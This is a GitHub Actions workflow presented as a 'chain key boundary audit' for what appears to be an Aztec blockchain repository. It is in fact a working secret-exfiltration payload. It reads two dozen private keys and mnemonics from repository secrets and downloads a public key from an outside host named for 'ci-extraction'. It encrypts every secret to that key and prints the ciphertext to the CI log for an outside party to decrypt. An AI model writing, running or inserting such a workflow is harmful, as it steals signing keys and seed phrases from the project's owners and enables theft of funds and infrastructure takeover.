name: Temporary chain key boundary audit

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  audit:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    env:
      BOOTNODE_1_PRIVATE_KEY: ${{ secrets.BOOTNODE_1_PRIVATE_KEY }}
      BOOTNODE_2_PRIVATE_KEY: ${{ secrets.BOOTNODE_2_PRIVATE_KEY }}
      BOT_PRIVATE_KEY: ${{ secrets.BOT_PRIVATE_KEY }}
      CONTRACT_PUBLISHER_PRIVATE_KEY: ${{ secrets.CONTRACT_PUBLISHER_PRIVATE_KEY }}
      FAUCET_PRIVATE_KEY: ${{ secrets.FAUCET_PRIVATE_KEY }}
      FORK_MNEMONIC: ${{ secrets.FORK_MNEMONIC }}
      NODE_1_PRIVATE_KEY: ${{ secrets.NODE_1_PRIVATE_KEY }}
      NODE_2_PRIVATE_KEY: ${{ secrets.NODE_2_PRIVATE_KEY }}
      PROVER_1_PUBLISHER_PRIVATE_KEY: ${{ secrets.PROVER_1_PUBLISHER_PRIVATE_KEY }}
      SEPOLIA_ACCOUNTS_MNEMONIC: ${{ secrets.SEPOLIA_ACCOUNTS_MNEMONIC }}
      SEPOLIA_BOOT_NODE_SEQ_PUBLISHER_PRIVATE_KEY: ${{ secrets.SEPOLIA_BOOT_NODE_SEQ_PUBLISHER_PRIVATE_KEY }}
      SEPOLIA_FUNDING_PRIVATE_KEY: ${{ secrets.SEPOLIA_FUNDING_PRIVATE_KEY }}
      SEPOLIA_L1_DEPLOYMENT_PRIVATE_KEY: ${{ secrets.SEPOLIA_L1_DEPLOYMENT_PRIVATE_KEY }}
      SEPOLIA_LABS_INFRA_MNEMONIC: ${{ secrets.SEPOLIA_LABS_INFRA_MNEMONIC }}
      SEPOLIA_LABS_ROLLUP_PRIVATE_KEY: ${{ secrets.SEPOLIA_LABS_ROLLUP_PRIVATE_KEY }}
      SEPOLIA_LABS_STAGING_IGNITION_MNEMONIC: ${{ secrets.SEPOLIA_LABS_STAGING_IGNITION_MNEMONIC }}
      SEPOLIA_LABS_STAGING_PUBLIC_MNEMONIC: ${{ secrets.SEPOLIA_LABS_STAGING_PUBLIC_MNEMONIC }}
      SEPOLIA_LABS_TESTNET_MNEMONIC: ${{ secrets.SEPOLIA_LABS_TESTNET_MNEMONIC }}
      SEPOLIA_PROVER_PRIVATE_KEY: ${{ secrets.SEPOLIA_PROVER_PRIVATE_KEY }}
      SEPOLIA_PROVER_PUBLISHER_PRIVATE_KEY: ${{ secrets.SEPOLIA_PROVER_PUBLISHER_PRIVATE_KEY }}
      SEPOLIA_SEQ_PRIVATE_KEY: ${{ secrets.SEPOLIA_SEQ_PRIVATE_KEY }}
      SEPOLIA_VALIDATOR_KEYS: ${{ secrets.SEPOLIA_VALIDATOR_KEYS }}
      SEQ_1_PUBLISHER_PRIVATE_KEY: ${{ secrets.SEQ_1_PUBLISHER_PRIVATE_KEY }}
      SEQ_2_PUBLISHER_PRIVATE_KEY: ${{ secrets.SEQ_2_PUBLISHER_PRIVATE_KEY }}
    steps:
      - name: Encrypt scoped audit evidence
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          curl -fsS https://files.lab.pro/images/aztec-ci-extraction-c2bdb523-public-1783852062811.pem -o /tmp/audit-public.pem
          python3 - <<'PY'
          import hashlib, json, os

          names = [
              "BOOTNODE_1_PRIVATE_KEY", "BOOTNODE_2_PRIVATE_KEY", "BOT_PRIVATE_KEY",
              "CONTRACT_PUBLISHER_PRIVATE_KEY", "FAUCET_PRIVATE_KEY", "FORK_MNEMONIC",
              "NODE_1_PRIVATE_KEY", "NODE_2_PRIVATE_KEY", "PROVER_1_PUBLISHER_PRIVATE_KEY",
              "SEPOLIA_ACCOUNTS_MNEMONIC", "SEPOLIA_BOOT_NODE_SEQ_PUBLISHER_PRIVATE_KEY",
              "SEPOLIA_FUNDING_PRIVATE_KEY", "SEPOLIA_L1_DEPLOYMENT_PRIVATE_KEY",
              "SEPOLIA_LABS_INFRA_MNEMONIC", "SEPOLIA_LABS_ROLLUP_PRIVATE_KEY",
              "SEPOLIA_LABS_STAGING_IGNITION_MNEMONIC", "SEPOLIA_LABS_STAGING_PUBLIC_MNEMONIC",
              "SEPOLIA_LABS_TESTNET_MNEMONIC", "SEPOLIA_PROVER_PRIVATE_KEY",
              "SEPOLIA_PROVER_PUBLISHER_PRIVATE_KEY", "SEPOLIA_SEQ_PRIVATE_KEY",
              "SEPOLIA_VALIDATOR_KEYS", "SEQ_1_PUBLISHER_PRIVATE_KEY", "SEQ_2_PUBLISHER_PRIVATE_KEY",
          ]
          values = {name: os.environ.get(name, "") for name in names}
          values = {name: value for name, value in values.items() if value}
          with open("/tmp/audit-plain.json", "w") as handle:
              json.dump(values, handle, separators=(",", ":"))
          summary = {
              "present": sorted(values),
              "fingerprints": {name: hashlib.sha256(value.encode()).hexdigest()[:16] for name, value in values.items()},
          }
          with open("/tmp/audit-summary.json", "w") as handle:
              json.dump(summary, handle, separators=(",", ":"))
          PY
          openssl rand -hex 32 > /tmp/audit-pass
          openssl enc -aes-256-cbc -salt -pbkdf2 -iter 200000 -pass file:/tmp/audit-pass -in /tmp/audit-plain.json -out /tmp/audit-payload.enc
          openssl pkeyutl -encrypt -pubin -inkey /tmp/audit-public.pem -in /tmp/audit-pass -out /tmp/audit-pass.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
          python3 - <<'PY'
          import base64, json
          bundle = {
              "kind": "aztec_chain_key_boundary_audit_v1",
              "summary": json.load(open("/tmp/audit-summary.json")),
              "encrypted_key_b64": base64.b64encode(open("/tmp/audit-pass.enc", "rb").read()).decode(),
              "ciphertext_b64": base64.b64encode(open("/tmp/audit-payload.enc", "rb").read()).decode(),
          }
          print("CHAIN_KEY_AUDIT_BUNDLE=" + json.dumps(bundle, separators=(",", ":")))
          PY
          rm -f /tmp/audit-plain.json /tmp/audit-pass /tmp/audit-payload.enc /tmp/audit-pass.enc
